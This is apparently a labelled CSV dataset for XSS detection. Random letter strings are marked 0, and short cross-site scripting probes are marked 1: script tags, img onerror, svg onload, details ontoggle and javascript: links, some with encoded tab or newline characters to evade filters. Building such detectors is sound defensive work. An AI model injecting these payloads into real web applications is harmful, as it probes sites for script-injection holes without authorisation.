payload,label
GHlvRpAAxsAQwREmBpaLoc,0
<%0ascript>prompt(1)<%0a/script>,1
bRbqSUmCGHDHnwWqCBnzkwGfQFvWWw  bThRtD,0
<%09details ontoggle=confirm()>,1
<img src=x onerror=prompt(1)>,1
WhUFSJGUGpnBqVr,0
wdazVwLrrrbjaJM,0
rkyAWqDHOjEYeRtS,0
<%0ascript>confirm(1)<%0a/script>,1
joHtTTIfAnznuHIDIyaOuyXLiThIQynQyOb,0
aelLJMUpapuzWckTgJisXFw,0
gRBpQ FVnVoajZVpSMjJbnABnd SDXQy,0
ldkRbZpyiAszs,0
<details ontoggle=confirm()>,1
ZvqZ TMAXEWXgCmFmYNHJSjNDeUZ,0
VVTupHehaBgseijiBNXqzy,0
TEaiKGWHIvOLRYjEPZEa,0
RYgrgQLiDBYfGkleKRH,0
<%09details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
jiuLeKjQ WUmqPCq,0
<img src=x onerror=confirm(1)>,1
<%0asvg onload=prompt(1)>,1
lzbzaTaxrXdWZXsADeaVXgexWrmrfuORlBx,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<img src=x onerror=confirm(1)>,1
VMkjMvcgJpzzeuleZdkQcLOIpGpg,0
ELUNlQsEbsRInkw ejXPGuSFWyJeCSVduzqCxYd,0
vNZvAvD YKwJpjN,0
<%0aimg src=x onerror=confirm(1)>,1
LerphedXVgRIMIGUMIzdvzhc,0
<%09details ontoggle=confirm()>,1
<script>confirm(1)</script>,1
hoRslFydAgJ o wUWZrUFYxdxGqykoEVRMu,0
<%0aimg src=x onerror=confirm(1)>,1
<%0asvg onload=prompt(1)>,1
ESsXvmkTdcm,0
<details ontoggle=confirm()>,1
PbsDwXFobdzJUJquUpueGxcSL ZishoSYB,0
<%0asvg onload=confirm(1)>,1
qmmrQBFfMySxtsFxUmIkuhponSkbvzMxeB,0
<%0ascript>confirm(1)<%0a/script>,1
mCQeUBHwvmko,0
<%09details ontoggle=confirm()>,1
<script>confirm(1)</script>,1
<a href=javascript:confirm(1)>click</a>,1
<%09script>prompt(1)<%09/script>,1
<script>confirm(1)</script>,1
fmUHJtBfdVh,0
<details ontoggle=confirm()>,1
AEFbxTs WiZ pHyjeTDzivvSTUffJDK,0
<%09details ontoggle=confirm()>,1
GNn TafBRHddbfMZQKuIeLYgDCSJji,0
<%09svg onload=prompt(1)>,1
BIHVZQOpUbPu,0
rfUfmLgi RuWszEXFAC nZn,0
rKGuRZnkxcLCLMVhQtZqKyP QNyYLbXEAU,0
<%09details ontoggle=confirm()>,1
hcYBGyPgntcNdBEmcZkGVfNIlwjnohWH,0
<a href=javascript:prompt(1)>click</a>,1
IBJp IplpDUqjYILVRTcOpsF,0
FwEqGeXHxz,0
<img src=x onerror=prompt(1)>,1
jcBAGiJjSGR YMrKARHAZeMwId anyQB,0
<script>prompt(1)</script>,1
WYyJlvBkcGPOZVxkkTipWFHiUbuNslVkcXHej,0
<img src=x onerror=prompt(1)>,1
 kSBwWbmWMYnMF EVMoEml VbPVnUhuLkbSphtvi,0
PRxeQnfAIWiwmxJTkBkQKfotPpLYzLk,0
<%09script>confirm(1)<%09/script>,1
<%09svg onload=prompt(1)>,1
hDTWCXdFQmgVfhNBFRpMJukdAkDjsmf,0
RxAcPffHTckazPMNfLV,0
LSnftcKLiWztEImBQqjKRImm,0
xxOvZPikjCd,0
JotBwo DSmdWMypBMapcccNBkHVZjbPYwmwZe,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
HXSAuKrpwQWDUBAWIAqwclQKCnTM,0
egiKGKJTMs,0
<%09svg onload=confirm(1)>,1
RhXemeWZAh,0
ZFMgsAflmyQmnkCkuVZEOrlNthhy,0
<%09svg onload=prompt(1)>,1
<%09svg onload=prompt(1)>,1
XwrUlCvSoxlHCMWCqEARPXhMKCskc,0
pXWNKCtpYOm,0
<%0adetails ontoggle=confirm()>,1
<%0aimg src=x onerror=prompt(1)>,1
ZLtYQsJQGyQypyqjzZoeaUbeNWlfB su,0
<a href=javascript:prompt(1)>click</a>,1
<%09img src=x onerror=confirm(1)>,1
HSUQNxVvMcdk,0
NdQKxkOLFsNrSrqehdTxUrChXpgByLLA,0
YogQpVLHfoo nQYcRArIwubUrzQRYsl,0
urIrlW AtjdoLHbAktwosXktvtgztSsanrQ,0
<%09img src=x onerror=prompt(1)>,1
<%0ascript>confirm(1)<%0a/script>,1
YgPPJXQkvPymIpRtwRSuZIBtHhwHEWHcpxG,0
yRHLDBHOAHTybakzKFv,0
fmbaooQ BmAJEYXzIERElArLqE FoxI HfmcKXe,0
<%09details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
<%0asvg onload=prompt(1)>,1
DEzmTznb jnXJEeupaDXBa,0
cOQSsmtausDwvCNQGzqKQNwqkEWPKn,0
cMrSOQOFPavDgpVqDTvuUhrcDcLZzANjv,0
gShSd iKuFFMuHRQ,0
nE RTzHeAaPKpkwiiDEcQDPHHyvkhqwmlqsUT,0
QxiDKwuItg EadeOPCNmG kidhFxXk,0
WDnIMfbiAvoQrkUSgvJQkyJKRCUKngnEJ,0
<img src=x onerror=confirm(1)>,1
RyoJTEjEsABZOFLDwhZOGPbUrfe,0
<%0aimg src=x onerror=confirm(1)>,1
VNdodJeoTUL,0
bgVODVQeTDveIKEqjPmgSUOOQiakWxnwCmYPaBC,0
YJGK Ptbgi,0
dfQVimtdjFTMSxKylJEeGMnTdvAgxYjbE,0
jxxtGolwyGkapPSYQhbhUUiDpD YyfaOJNfi,0
KvDLpBlGcWXJ UCydPsmfqKilBDNimyGxmWT,0
zJqDThwRXuVAsHRDBtNqwqEbEAICoXkk,0
sCSjHKfRgiNidohrXntUXwPLYFJSOn,0
zAvGKSPJQk,0
jytPVMIWNyexXhoDYLZT cclz,0
<%0asvg onload=prompt(1)>,1
<img src=x onerror=confirm(1)>,1
<%09svg onload=prompt(1)>,1
jnvn sBCXGFzhfWQqfHeyIQsZ jSCmGPYk,0
<%09details ontoggle=confirm()>,1
<%0aimg src=x onerror=prompt(1)>,1
IjrQciScuDYacigXrXjXai,0
<svg onload=confirm(1)>,1
<%0aimg src=x onerror=prompt(1)>,1
<script>confirm(1)</script>,1
<img src=x onerror=prompt(1)>,1
<%09img src=x onerror=confirm(1)>,1
jCMosFIexLkAyUBJNHbsDEuzKZKHWJVok,0
nMWFanpcHhfwTLuuvR cEfyDstZBsuwnBmY,0
<%0adetails ontoggle=confirm()>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
XNQwum KYnMVoJxMhOTKbvLuiF xd ,0
DaHSqWFtRjmJLouyHeiqbwvgWkJioG,0
<%09svg onload=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
qicplevaYu,0
wlkSqAgiSoIGgBheFsZhGXaBbfzP,0
KxLzmaIdvBbrAFhyhEddRgmmvbdnE,0
<%0adetails ontoggle=confirm()>,1
<svg onload=confirm(1)>,1
<%09img src=x onerror=prompt(1)>,1
<script>prompt(1)</script>,1
<details ontoggle=confirm()>,1
zHMbVsSw UvfduIbSAb,0
<a href=javascript:prompt(1)>click</a>,1
XINdYYPvvuRwmBGXBqELfKfVSvVTNMp,0
<%0aimg src=x onerror=confirm(1)>,1
LQxrxMXjLvajZXbTQzDmLpzFcToSQrrPiXvUkM,0
<%0adetails ontoggle=confirm()>,1
XLCIFPOXzNSoKpRtKLyuZvoQwTuSbrLIjOxcx,0
RUtjxIdlIqshMDGdWAHKqFteGdwpugmflyeL,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
zDWOLOhUKXZEesUXJtrqVyyjxWjoRnnXk,0
fepuNGkZqfqHDFNouM QRCqAnJTkLlp,0
<details ontoggle=confirm()>,1
<img src=x onerror=prompt(1)>,1
<%09script>prompt(1)<%09/script>,1
<a href=javascript:prompt(1)>click</a>,1
<%0adetails ontoggle=confirm()>,1
YTDpxxifsHhQGkpaKWlCsTz,0
tPkyXdkmlz,0
jezqdK gfsdrl MhbyAMHCLlbzIXzEt Cwf ,0
EH bxcVQfBAJCarwmGSPcYWtmIsDSnbWriv,0
<details ontoggle=confirm()>,1
ejy XrsUeXKPNnlBTXbtjtvHtRwOm,0
pwGFmIKzHxlYATcCMTaECaBZUwMWHADnOhZE Vlh,0
aTMoN tSDOUKZErlPQtilOhoGWvDJ,0
hpjbkYONqydyFgOtZJuhm,0
NdfvJDLJJxZPhLUiVpTijKUiratPEdgaAamHRh o,0
<%09svg onload=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%09details ontoggle=confirm()>,1
<%09script>prompt(1)<%09/script>,1
YzTQauioSZG,0
<img src=x onerror=confirm(1)>,1
HnSOmViXwFMynmsZMaLv,0
no ypgbzhlZ,0
iDFCmmEiEBICNudEaOFpJONsSaqAXgFPIggwL,0
rKEuMZaGMVQyMInFFhSADYUiBzfAivMF,0
fWgXafqBSVmNnsaYYBaWTGaskzp ,0
AM tAKUMAhyJvcPysqB xJoEFEnUcOmav,0
kUhpfFSCeMvWlbxqw nJOswrexP,0
TvqvaHxKEgiLUf,0
ggvfiwKAhrYNTfvFCk,0
HVJyoxMmLoZVcTUui,0
<%0asvg onload=confirm(1)>,1
ZDVYwrFLKhmrLAEUsyzztEdnwRDZHrbhZKcPUOW,0
<details ontoggle=confirm()>,1
<%09img src=x onerror=prompt(1)>,1
<details ontoggle=confirm()>,1
yPOivxPXTiwXuqd IM,0
rilCrNMFYktPnnlBTocmmkyMIgNUGcjkw,0
QAXCwAoJGjzeTLy,0
<%0asvg onload=confirm(1)>,1
 BHWeXHrOVUxC,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
PWskrBjXxBDrQsFREsFXiejHnvUNmCrCIk,0
xiWcK zKylDy,0
<script>prompt(1)</script>,1
CXGfAtZuSyZrDTfGAlWLxKTXhF,0
<details ontoggle=confirm()>,1
SbviFCKDDKc,0
<%09script>prompt(1)<%09/script>,1
<%0asvg onload=confirm(1)>,1
vXZhRcAZewTiTlGCslegbfP ,0
Wm ZhYrPijeVzFHRlESTWnsLDzC,0
OfFVzvxrTtpauLbgeyETHfztZzoqfargSYsXG ,0
<%09img src=x onerror=prompt(1)>,1
cRiGGafUYlI,0
HzJhJUaJBDwQ,0
zDwNxWAXfHxOElqqcmmG eds,0
OxooAwgyRrVJLSPWfnX,0
 L niYDpgumQyd,0
ZIxIyYfsEIDHWKv,0
SmgglptZRLkmbhnsHbkailIFUPVYeErGzC,0
<script>prompt(1)</script>,1
<%0ascript>prompt(1)<%0a/script>,1
<%0asvg onload=prompt(1)>,1
<img src=x onerror=prompt(1)>,1
<svg onload=prompt(1)>,1
hkIGHj akFxkSRcOuQaHTYqNXCvgkIgpzVWzcrNu,0
DYyMsyZGoVCCSVCkwzcNiehpNWisukzwIQdn,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
hfvWkvqEOkOtyJyDThmr,0
QKYxsVCLWeFFi m FSMYmhGtkrfI,0
<%0asvg onload=prompt(1)>,1
KQfxnfsAokmcLDARyqclFLaWSTeimosv,0
<%09script>confirm(1)<%09/script>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<details ontoggle=confirm()>,1
<script>confirm(1)</script>,1
yQTyrdrbYhqsBkRHrPVUeODxws,0
<script>confirm(1)</script>,1
<%0adetails ontoggle=confirm()>,1
tAzdHvf jeI IKOKNgAGRiVxxoAhqS,0
ANOLnXcAzFXpyZNKlEeUaubYv,0
bxvYyIaLfKvjKUzWKlmclzySqfgpTjQrBcGi,0
<%0asvg onload=confirm(1)>,1
QzGAUsreCeyePTdAFeLxCxP fYAHiOHRsmMeu,0
<%09img src=x onerror=prompt(1)>,1
VtvuKzgDynPelMjVwf,0
FORAkfcpseACpEZXRFmdPxc,0
JbAE uaCVcKhsbpIJTrKbGyHxDbDLqkMWFSgGx,0
<%0ascript>confirm(1)<%0a/script>,1
<details ontoggle=confirm()>,1
<%0ascript>confirm(1)<%0a/script>,1
HrDHIGalYxBf,0
<%0aimg src=x onerror=confirm(1)>,1
QnFXaMIKJpdZdnKUcFXHFJDubUkXmT ,0
aKvuBevTYnuqx,0
zbTmBktjJmaeWbRZKV,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
QwFWYvzogzjwIleeRaXTDyXsjCfLxqEVdC,0
GOYzCmKunMj,0
<%0ascript>prompt(1)<%0a/script>,1
bKuSyugSgme,0
<details ontoggle=confirm()>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
MWJUtcpqTkU,0
<%0asvg onload=prompt(1)>,1
SmjaCsTiXfJDxoGaeCuS,0
<%0ascript>prompt(1)<%0a/script>,1
<%09details ontoggle=confirm()>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
MblaNdCmJgMmqgUogZwSLdfiqIRxcZLMdUgZcUi,0
<%09details ontoggle=confirm()>,1
<svg onload=confirm(1)>,1
cxbOrhEbOeLBFcovYkUiuJvGiGaGDnP,0
<%09script>prompt(1)<%09/script>,1
BrHLeMDsCJlAFipyxVJyJnQNH,0
tEhwVjpAU QWSYZKmvldApVPsk,0
<a href=javascript:prompt(1)>click</a>,1
OgJCEQWFRYUqXYbJJrkZ,0
urDinwNwQsCZ,0
<%09details ontoggle=confirm()>,1
<%0aimg src=x onerror=confirm(1)>,1
wHHoQsDmEOyf,0
GSlbJdbBhWNNBpTtPcUiSpfVRUhcNlcEmZdCCbGZ,0
gdAbbgwPqeVBVwFEMLcSNmc,0
<a href=javascript:prompt(1)>click</a>,1
<%09svg onload=confirm(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
ymEZDIpQgIkrn,0
JVksRYCsWV,0
<%0ascript>prompt(1)<%0a/script>,1
okVrqwUyyZKvFfzVXDjzcpANqlDRuYwJX,0
TofDGmBBWCqMZISInqKZszmsgPQJEhiNNprv,0
<%0ascript>prompt(1)<%0a/script>,1
<script>confirm(1)</script>,1
qgYsetBDq WLYhMFFJcZf,0
<svg onload=confirm(1)>,1
<%09script>confirm(1)<%09/script>,1
<%09svg onload=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
NuYpDlVeTtMZIFcbgXGJsvSGRrxJSXdixiLz,0
<%09img src=x onerror=confirm(1)>,1
<%09details ontoggle=confirm()>,1
<svg onload=prompt(1)>,1
AtbysHFPnnDzVEH,0
<a href=javascript:confirm(1)>click</a>,1
<a href=javascript:confirm(1)>click</a>,1
pexrLIRTAXMLgoPtSfhWVlE  EAfwKdSum sQH,0
BICxlBxbuTKNOYEoAsxIo,0
<%09svg onload=confirm(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
dniCCAzAZwEdNJnqbTvK,0
MYRErDvYGIZfOmVYYiorbLO,0
i qYIWBSEowmEDsz,0
LMchNnJGZAhYEcWWvMhNiWhExWxXA,0
<%0asvg onload=prompt(1)>,1
rpfFsesMPCmJMCvWggNRuKqgP,0
<%09details ontoggle=confirm()>,1
kdnGyJxINIAPWtuaBCczRbqk,0
<%09script>confirm(1)<%09/script>,1
<%09details ontoggle=confirm()>,1
XPFBnHOMCQLfRiYKazEza,0
<script>confirm(1)</script>,1
<%0asvg onload=confirm(1)>,1
CJmbKnlaRnPQj,0
nviVUPjTzQtIlOfCnkASBFiEB,0
<%09script>prompt(1)<%09/script>,1
SjIdC KFBUzJLA PxPTOIpQPWmXkBnX,0
tTznVAEUAiRwRiXgnmeqesiovTPsvooU G,0
<a href=javascript:confirm(1)>click</a>,1
kFUXfqlvaraswOvnAmOpUwgVHw,0
plJZRfmZhArFrurUscheqYoXDdoRaBbszkBV,0
kFscUtJkEeHo,0
<details ontoggle=confirm()>,1
eNTVzL zeOFKQmJLdFgv,0
RXmOqKlTprzcwZRVVizNPjOdudtZvmb,0
hqzRaucX oRsOHGbb,0
<svg onload=confirm(1)>,1
lnzljfvKRFPZpSEhFHJMayefUtpnTjE lM,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0adetails ontoggle=confirm()>,1
<a href=javascript:prompt(1)>click</a>,1
aAIIYhcXpQTzZ RWWEoYPZGvzNadlqRrV XTr,0
<details ontoggle=confirm()>,1
kqJDzNYJNnQXvxnb,0
PFNXIiMzlZmlADOqgAmwdDcePIqxlOsbtva,0
<%09svg onload=prompt(1)>,1
ICxIJglwGYjcKrZWFrXqPHYZOuMeKwQKT,0
yHtgynuTEYMWYYxScvOfx,0
<script>prompt(1)</script>,1
uDIIHfC DwGXqzCbQjlJAuNmqfMNi,0
ssxGyxWRgrzukpjsYlHYNQKJNaqK,0
nBzLTeyYdbrCaYQbuv,0
<script>prompt(1)</script>,1
ywQEMOkgaGHbL  j aMjyNycjeWpmLWzQ,0
sqCVbUTaJG,0
<%0aimg src=x onerror=confirm(1)>,1
hHvR FAunsycNpKunPuIoZQBEr,0
 GRfhkbYLmsvpldNLFhr,0
toiLRhTlDXVf,0
ehVKtCFnaFrOcYlF EIxv,0
wFColeFJlWCQwwQXUxgUDeWODr,0
<%09details ontoggle=confirm()>,1
cEJsHQMwiOIukFHgQuPIXvBwNfrJgQzNAf,0
<%09svg onload=prompt(1)>,1
xNnFgehPiWadhcLjAuD,0
hTYvtgDhYMnFlYe,0
<%0asvg onload=prompt(1)>,1
<%09details ontoggle=confirm()>,1
<%0ascript>confirm(1)<%0a/script>,1
IxYdbvpEITxKxoTE yfJbVw,0
vKmlHmKNMMm ,0
AOSCKuDhYUNsjXDnhdYKCWh,0
<script>confirm(1)</script>,1
<%0ascript>confirm(1)<%0a/script>,1
<script>prompt(1)</script>,1
EUhlCAzOpKZenQlapJlyX NYYDHXrkb,0
<%0aimg src=x onerror=prompt(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%09img src=x onerror=prompt(1)>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
bZvLxkdWQhVIFgIlNXAxgHSXLLbx,0
SbErDmmoMaXTdoaRCKez EsVulenzhu,0
<%0adetails ontoggle=confirm()>,1
<img src=x onerror=confirm(1)>,1
<%09script>confirm(1)<%09/script>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0ascript>confirm(1)<%0a/script>,1
<svg onload=confirm(1)>,1
uqDcwyVuRyitl MhBjKF ofC,0
eoUGWXayMkuWYmvGKKguvSBpoZEKZH,0
<%09script>confirm(1)<%09/script>,1
exrXAH VuLzgkFGCEHd XhDH,0
TbdJiTbPNmGmcJXBXgj UjOAcWLAUTistbK,0
o dwtCcCGYCPYn,0
jMrUiaGOgzJLuZhSnYMvk,0
yoSjDMAUeqvMMejIEahj,0
<img src=x onerror=confirm(1)>,1
UpcOOaAJoMwaOZECsQsTKOQjAChNkKA msAPot,0
<details ontoggle=confirm()>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
GylYrcZDOmGtbmQYPnClhAjQdLqDxsUeLG,0
<img src=x onerror=confirm(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
wyfoxLMUUpezNf qKfNnWBPpUWBNJ,0
f imtNlnxwCZg EBJrddQiSz,0
 ELurDSbZBJGlitjfRaDGqnZDoJzltZnXGRj,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
EakmFqWbv ,0
<details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
UhbJlAANICftZknYwNPgjbMgA,0
xuDPakeZDCNAeJZhb WiALSW,0
unpsOscwrLePghtLTtECmBxOzwbGoD,0
ZxUILdHDccluNGnqI,0
<%09details ontoggle=confirm()>,1
ZWLMRbdQjStFQSRkxSsfBejvcwS fEZjq XR,0
<%0aimg src=x onerror=confirm(1)>,1
FaxZIKZBtEgigQEDmhDq RLGYlgwFtt,0
ljsUvDjHXldCfpODTjRLnjupiU,0
<%09details ontoggle=confirm()>,1
<%0asvg onload=confirm(1)>,1
ZNuUaEDosclMHAFqsyEvIChEeXZXbeRZvkP,0
<%0asvg onload=prompt(1)>,1
<%09details ontoggle=confirm()>,1
<%09svg onload=prompt(1)>,1
<svg onload=prompt(1)>,1
<svg onload=prompt(1)>,1
MtWGMUIBREoCkPpdNnxDCbUkZnGaKxOMb,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
MeEoeH eoedu,0
YNAQjGUsMIiAZcfOTYcXMz,0
<img src=x onerror=confirm(1)>,1
 EMjLqKzxLyvJHHBBGoXytBjg,0
RoJNCTzEYGyKzqzlkmO,0
ejRclnZEsmAzLHznFirAKubbNmLQAEKmNw,0
pRzKfp ZDtPwpRwg udnxiJXvjlUDJWqhS,0
<%09script>confirm(1)<%09/script>,1
<svg onload=confirm(1)>,1
<svg onload=confirm(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<details ontoggle=confirm()>,1
toNErXoiMFRdgcinJwORfZfeyKNwVIVl,0
zbvwplTXHsubpPPwUhsNoHlpUAQqenNZQhY,0
<%09details ontoggle=confirm()>,1
sInnljTGcpRPOPbFwiVugMpczjqsrgBhOzGDnyGQ,0
kcGsfJdJrGWWuWemftMHLtyBKFb,0
zMukDSNDWVSIrBMkIyfIlMlgtUpyLHItv qgPrgU,0
ysLBkvGAlUCeHZBFGedSmzVkI,0
KsvgvDMRaAS,0
<a href=javascript:prompt(1)>click</a>,1
luLCkINWoPLoIrnjsj,0
CqZmUltgscpXWlZecO,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%0adetails ontoggle=confirm()>,1
EDUDjOuHONgfbPwALDZw MUSGQYhSRwrHDAlcKJ,0
<%0asvg onload=confirm(1)>,1
TpzFKgGLjWZzYPpP,0
jYAtFiiJldwdKZgCfBWgoUPiWereZKYoRdsxhEsp,0
ysTpvSoAEQatQFIteWwMoERjNyCoAtWlakFjnGbx,0
ygPwnPCIgzNhIatzaBs MCE ,0
<details ontoggle=confirm()>,1
oynONtOBgrCJW,0
TkCAKTzMjfKKtjWlRANdVJxnboYoZVXvXvkjpwvd,0
UvRyYdcXvluhdhvqFNzmWWHOdaN,0
OrustZyMK A,0
OOZqqZhHYOoDAkTvPMtCnBMEqPWptsYkDY,0
<svg onload=prompt(1)>,1
yAmpfhieywvvSNKrzYVNjOmHvwVpEuFIEerHTQbG,0
<%0ascript>prompt(1)<%0a/script>,1
HvvclWJIwd NvGO,0
HCvNZapZRzSKdspasHO,0
<img src=x onerror=prompt(1)>,1
YxRNpzquAMPzsvyYLpVdjQUkdex,0
Dttoyxcu eWkEXoCfbvOYZGJKcSdDmRladbazImA,0
RSozoFW PJoWxhGOGUvVJf,0
MSxJQUiurFTlQOipKa I,0
<%0adetails ontoggle=confirm()>,1
<svg onload=confirm(1)>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
sRDNmFzEeLeURapw  xSiR,0
<%09details ontoggle=confirm()>,1
<%09script>prompt(1)<%09/script>,1
K MPOUcrvPS OjXTMQLaTQCSZFJOfTExQeOzQK,0
ErlgDrvfVDXUFzD,0
yLMg PuHdCF,0
<a href=javascript:confirm(1)>click</a>,1
pXqqcLkdvgpWjFKzLdMnWng,0
<%09svg onload=prompt(1)>,1
<script>confirm(1)</script>,1
<img src=x onerror=prompt(1)>,1
<%09script>prompt(1)<%09/script>,1
<img src=x onerror=confirm(1)>,1
iJDSf BNyEfIG,0
<img src=x onerror=prompt(1)>,1
<script>prompt(1)</script>,1
<a href=javascript:prompt(1)>click</a>,1
JSRGsiCoBehvQwaaYIZbLhtcIVBKaEiNj,0
<details ontoggle=confirm()>,1
<%09img src=x onerror=confirm(1)>,1
<details ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
WNpaymqUWqHKwezn,0
vnvlNGeOYYuLPoofkaPiTvSAHE,0
<%09script>prompt(1)<%09/script>,1
OmypxlzyaIYdXMRTFfu bFjAVv,0
<%0ascript>prompt(1)<%0a/script>,1
sksDLlxlQJVDbVedBppsnHIAqxEndJvR,0
<%09script>confirm(1)<%09/script>,1
<img src=x onerror=prompt(1)>,1
gjsJtxyqRB,0
EdccULWGvUXMiTLgqg,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<details ontoggle=confirm()>,1
<a href=javascript:confirm(1)>click</a>,1
FRZDulXFRkgQPVlhqablbdiCLFVyVEnLQX,0
<img src=x onerror=prompt(1)>,1
RQslXwizPYJHWgBIAjPWyDKNPCjbO,0
KZUexEGJzYclBvGtmRpdUWuWPq,0
<%0asvg onload=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
uwvS nEHFXBpgcBZQoa FeN,0
FRrAOoCWty,0
htaGkYVQCznpRbRyhNigZFEUJIN,0
IThrOWVDOTvEXxRRdqjXaVzgvTZIIiSi,0
UMMjjXxoKmBurKIIBvcmtwVttOprvQAtUcQNlXL,0
WCqNwxgDqlYPJiLBivEAQQhoMKPoDRIhy,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09img src=x onerror=confirm(1)>,1
<svg onload=prompt(1)>,1
<details ontoggle=confirm()>,1
<%0aimg src=x onerror=confirm(1)>,1
rWNjkgRpltLUG LCnqtn,0
XgmdrltILvcrDpNiI BV,0
E zYDfJB saLyBxk,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%09script>prompt(1)<%09/script>,1
<details ontoggle=confirm()>,1
XgSRJHcwlhNxiVTBECTuwdnPOaPbTOwppq uaeXX,0
<%09script>confirm(1)<%09/script>,1
JqxhHubwaJgO qTBzusGcLdsfjKRcd Un,0
xdiBdYPJplX,0
NiDxbhvNdRFRCabPryOvNUUZqWFOMyZHSigEpWK,0
RkKbzFAdCAlZbhrHP,0
<%0aimg src=x onerror=confirm(1)>,1
lOSKxTgpkjqrctxQsIQdjQVeMTDoteqXzOpiMM,0
SzzCFCskhFlZuINwNXXBMplzrcdgOcwWLuOoac,0
<svg onload=prompt(1)>,1
wwNvXyprsamIdzkeEgs suAsgenjdSBFDuU,0
<%09details ontoggle=confirm()>,1
<a href=javascript:confirm(1)>click</a>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
zkMzkxXXwWunNmMalAKGIUavM,0
sKDT UPofvmoprseNBeYydqSetPEcbmpkqYBg,0
<%0aimg src=x onerror=prompt(1)>,1
<script>prompt(1)</script>,1
<%0adetails ontoggle=confirm()>,1
dZvOWHFjXU SHMa,0
DSJQjZtIZn PPcVPjsUMsQ jkGKPwoNr ,0
nmszwcQrnt ZodbpXPBTTUmNtxJGuAG,0
UdnNdUOmqAisc nrXPOSNMerFMgdEcRpkdNogSa,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%09img src=x onerror=prompt(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
hBeQhwoxDFyE aSXwhfjfjymQ,0
VbGLB INpBzMwKJUKxuRflaVMcUldBkSylQItLi,0
OCCVwjt woPuqNKSvtAzhmsiIEDJ,0
<%09img src=x onerror=confirm(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%0aimg src=x onerror=confirm(1)>,1
<svg onload=prompt(1)>,1
OpwaruRGrXMdpDYwIvYkyvXq,0
<script>prompt(1)</script>,1
malmLyjwZm,0
<%0adetails ontoggle=confirm()>,1
<script>confirm(1)</script>,1
F vdUdNlaTgjePStsOfQd,0
<%09details ontoggle=confirm()>,1
jfmyBzpTmzMoYephMAxlDucgPCl,0
<%09img src=x onerror=prompt(1)>,1
AUq ZoXnvdrHBTUFC LA,0
qlSiEhhrYOSmTmUBaGfsNRqGkYTDwl bgmGpsNWn,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
sET QvGjaiFMIeKVJFSDPJPW,0
apTxQcdeVgpOshUunWSWIBNqyDQtQuMtckfks,0
<%09svg onload=prompt(1)>,1
SxNyvqUaGojloDrCQIwavogw xLFRIjLQ,0
MQkbmcC OuetMGcWqcHcaPGJNftWjas,0
<%0aimg src=x onerror=prompt(1)>,1
